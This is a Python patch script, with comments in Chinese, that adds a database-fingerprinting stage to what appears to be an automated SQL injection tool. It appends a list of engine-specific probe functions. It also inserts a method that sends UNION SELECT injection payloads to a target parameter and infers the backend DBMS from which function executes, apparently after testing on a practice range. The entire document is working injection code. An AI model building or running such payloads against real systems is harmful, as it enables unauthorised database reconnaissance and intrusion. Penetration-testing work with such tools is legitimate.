# -*- coding: utf-8 -*-
"""阶段 1（含三处修复）：DB_PROBE + L2 通道。

修复项（上一版遗漏，均已实测踩到）：
  F1 baseline 传递 —— 其余通道都返回 baselineResp，下游依赖，L2 必须补齐
  F2 剔除回显 —— 靶场回显 SQL 文本，payload 自带的 '__SQ__' 会被回显成假命中
                 （与 ErrorDetector 的 P0 同源）
  F3 pick 类型 —— 元组取值需 instanceof 判 RegExp，否则 TS 报 string|RegExp 不可用
"""
import io

# ── 1) payloads/index.js：追加 DB_PROBE ─────────────────────────────────────
P1 = 'server/src/engine/payloads/index.js'
t = io.open(P1, encoding='utf-8').read()
BLOCK = '''

// ============================================================================
// DB_PROBE —— 特有函数「可执行性」定库（L2 通道）
//
// [新增 2026-09-17] 依据 docs/dbms-fingerprint-refactor.md。
// 判据：**判别要基于「引擎行为是否存在」，而不是「返回文本长什么样」**。
//
// 探针：<orig><boundary> UNION SELECT '__SQ__', <expr>, NULL, …-- -
//   · expr 放在**非回显列**也会被引擎求值 —— 所以「剔除回显后标记仍出现」
//     即等价于「expr 能执行」：函数不存在 → 整条 UNION 报错 → 标记不出现。
//   · 先发一发基线（第 2 列 NULL）确认该点 UNION 形态可用，避免把
//     「列类型不兼容导致的失败」误读成「函数不存在」。
//   · **必须剔除响应中回显的 payload**，否则 payload 自带的 '__SQ__' 会被
//     页面回显成假命中（实测：靶场把 MySQL 判成第一个探针的库）。
//
// 约束：expr 必须是该库（族）特有的；通用函数多库可执行，放进这里只会制造新的多命中。
// 族探针（多库共享同一 expr）用 pick 按返回值细分。
// 可信度：[高] = 官方文档明确的系统函数；[待确认] = 需真机验证。
// ============================================================================
export const DB_PROBE = [
  { dbms: 'SQLite', expr: 'sqlite_version()' },                                  // [高] SQLite 专有
  { dbms: 'H2', expr: 'H2VERSION()' },                                           // [高] H2 专有
  { dbms: 'Derby', expr: 'SYSCS_UTIL.SYSCS_GET_DATABASE_VERSION()' },            // [高] Derby 专有系统函数
  { dbms: 'Firebird', expr: "rdb$get_context('SYSTEM','ENGINE_VERSION')" },      // [高] Firebird 专有上下文
  { dbms: 'MonetDB', expr: '(SELECT sys_version FROM sys.version)' },            // [高] MonetDB 专有系统视图
  { dbms: 'DB2', expr: 'CURRENT SERVER' },                                       // [高] DB2 专有伪列
  { dbms: 'Informix', expr: "DBINFO('version','full')" },                        // [待确认] Informix 专有
  { dbms: 'PostgreSQL', expr: "current_setting('server_version')" },             // [高] PG 专有（比 version() 更专有）
  { dbms: 'Oracle', expr: '(SELECT banner FROM v$version WHERE rownum=1)' },     // [高] v$version 为 Oracle/DM8 专有视图
  { dbms: 'DM8', expr: '(SELECT banner FROM v$version WHERE rownum=1)',          // [待确认] 与 Oracle 同 expr，靠返回值细分
    pick: [[/DM\\s*Database|Dameng|DM8/i, 'DM8'], [/Oracle/i, 'Oracle']] },
  // 族探针：MySQL/MariaDB/TiDB 共享 @@version_comment；MSSQL/Sybase 共享 @@version
  { dbms: 'MySQL', expr: '@@version_comment',
    pick: [[/MariaDB/i, 'MariaDB'], [/TiDB/i, 'TiDB'], [/MySQL/i, 'MySQL']] },
  { dbms: 'SQL Server', expr: '@@version',
    pick: [[/Adaptive Server|Sybase/i, 'Sybase'], [/Microsoft SQL|SQL Server/i, 'SQL Server']] },
];
'''
if 'export const DB_PROBE' not in t:
    io.open(P1, 'w', encoding='utf-8').write(t.rstrip('\n') + '\n' + BLOCK)
    print('[OK] payloads/index.js 追加 DB_PROBE')
else:
    print('[SKIP] DB_PROBE 已存在')

# ── 2) DBFingerprinter.js ───────────────────────────────────────────────────
P2 = 'server/src/engine/DBFingerprinter.js'
t2 = io.open(P2, encoding='utf-8').read()

OLD_IMP = "import { FINGERPRINT, DB_VERSION, nullSequence, dbmsFromError, TIME_VECTORS, PAYLOADS, fillPayload } from './payloads.js';"
NEW_IMP = "import { FINGERPRINT, DB_VERSION, DB_PROBE, DBMS_LIST, nullSequence, dbmsFromError, TIME_VECTORS, PAYLOADS, fillPayload } from './payloads.js';"
if OLD_IMP in t2:
    t2 = t2.replace(OLD_IMP, NEW_IMP, 1); print('[OK] import 加 DB_PROBE/DBMS_LIST')
else:
    print('[SKIP/MISS] import')

# F1：调用处补 baseline
ANCHOR = "    // 4) 各库版本函数置于首个回显列，检测标记间版本特征"
L2_CALL = """    // 3.5) [新增 2026-09-17] 特有函数可执行性定库（L2）—— 失败则继续走原通道（只增不改）。
    const probed = await this._fingerprintByProbe(ctx, httpClient, target, point, obf, columns, echoCols);
    // F1：其余通道都返回 baselineResp，下游依赖，这里补齐
    if (probed) return { ...probed, baseline: baselineResp };

"""
if ANCHOR in t2 and 'this._fingerprintByProbe(ctx' not in t2:
    t2 = t2.replace(ANCHOR, L2_CALL + ANCHOR, 1); print('[OK] L2 调用已插入')
else:
    print('[SKIP/MISS] 调用插入')

METHOD_ANCHOR = "  // 报错签名定库：遍历高频库顺序，注入各库 error[0]"
METHOD = '''  /**
   * L2：特有函数「可执行性」定库。
   *
   * 探针 `<orig><boundary> UNION SELECT '__SQ__', <expr>, NULL, …-- -`：
   * expr 即使放在非回显列也会被引擎求值，故「剔除回显后标记仍出现」等价于
   * 「expr 可执行」。先发基线（第 2 列 NULL）确认 UNION 形态可用。
   *
   * 返回 { dbms, version } 或 null（null = 本通道无产出，继续走原通道）。
   * @param {object} ctx
   * @param {object} httpClient
   * @param {object} target
   * @param {object} point
   * @param {(s:string)=>string} obf
   * @param {number} columns
   * @param {number[]} echoCols
   */
  async _fingerprintByProbe(ctx, httpClient, target, point, obf, columns, echoCols) {
    if (!Array.isArray(echoCols) || !echoCols.length || !Array.isArray(DB_PROBE) || !DB_PROBE.length) {
      return null;
    }
    const n = Number(columns) > 0 ? Number(columns) : 1;
    const nulls = nullSequence(n).split(',');
    const idx = echoCols[0];
    const boundary = point?.boundary || '';
    const orig = point?.originalValue || '1';
    const MARK = '__SQ__';

    // F2：剔除响应中被回显的 payload 原文。否则 payload 自带的 '__SQ__' 会被页面
    // 回显成「假命中」，让每次探测都看似成功（实测：MySQL 靶场被判成 SQLite）。
    // 归一化方式与 ErrorDetector 的 P0 修复一致：HTML 实体 → 字符，再 URL 解码两轮。
    const stripEcho = (raw, payload) => {
      let t = String(raw || '');
      t = t
        .replace(/&#(\\d+);/g, (_, d) => String.fromCharCode(Number(d) || 0))
        .replace(/&#x([0-9a-fA-F]+);/g, (_, h) => String.fromCharCode(parseInt(h, 16) || 0))
        .replace(/&lt;/g, '<').replace(/&gt;/g, '>')
        .replace(/&quot;/g, String.fromCharCode(34)).replace(/&apos;/g, String.fromCharCode(39))
        .replace(/&amp;/g, '&');
      for (let i = 0; i < 2; i++) {
        try {
          const d = decodeURIComponent(t.replace(/\\+/g, ' '));
          if (d !== t) t = d; else break;
        } catch { break; }
      }
      const variants = new Set([payload]);
      try { variants.add(encodeURIComponent(payload)); } catch { /* noop */ }
      for (const v of variants) {
        if (v && v.length > 3) t = t.split(v).join('');
      }
      return t;
    };

    const buildCols = (secondExpr) =>
      nulls.map((_, i) => {
        if (i === idx) return `'${MARK}'`;
        if (i === 1 && secondExpr != null) return secondExpr;
        return 'NULL';
      }).join(',');

    const probeOnce = async (secondExpr) => {
      const payload = `${orig}${boundary} UNION SELECT ${buildCols(secondExpr)}-- -`;
      try {
        const res = await sendInjection(httpClient, ctx, buildInjectionRequest(target, point, obf(payload)));
        if (!res || res.__netErr) return null;
        const cleaned = stripEcho(stripEcho(String(res.data ?? ''), payload), payload);
        return cleaned.includes(MARK) ? cleaned : null;
      } catch {
        return null;
      }
    };

    // 基线：确认该点 UNION 形态可用；不可用 → 本通道无产出（保守）
    if (!(await probeOnce(null))) return null;

    for (const probe of DB_PROBE) {
      if (!probe || !probe.expr) continue;
      const body = await probeOnce(probe.expr);
      if (!body) continue; // expr 不可执行 → 下一个
      let dbms = probe.dbms;
      if (Array.isArray(probe.pick)) {
        // F3：元组取值须判 RegExp/string，否则 TS 报 string|RegExp 不可用
        const pos = body.indexOf(MARK) + MARK.length;
        const seg = body.slice(pos, pos + 400);
        let picked = '';
        for (const pair of probe.pick) {
          const rx = pair && pair[0];
          const name = pair && pair[1];
          if (rx instanceof RegExp && typeof name === 'string' && rx.test(seg)) { picked = name; break; }
        }
        if (!picked) continue; // 族命中但细分不出 → 跳过（保守，不瞎猜）
        dbms = picked;
      }
      if (!DBMS_LIST.includes(dbms)) continue;
      return { dbms, version: parseDbmsVersion(dbms, '') };
    }
    return null;
  }

'''
if 'async _fingerprintByProbe(ctx' not in t2:
    if METHOD_ANCHOR in t2:
        t2 = t2.replace(METHOD_ANCHOR, METHOD + METHOD_ANCHOR, 1); print('[OK] 方法已插入')
    else:
        print('[MISS] 方法锚点')
else:
    print('[SKIP] 方法已存在')

io.open(P2, 'w', encoding='utf-8').write(t2)
print('  DBFingerprinter 行数:', t2.count('\n') + 1)
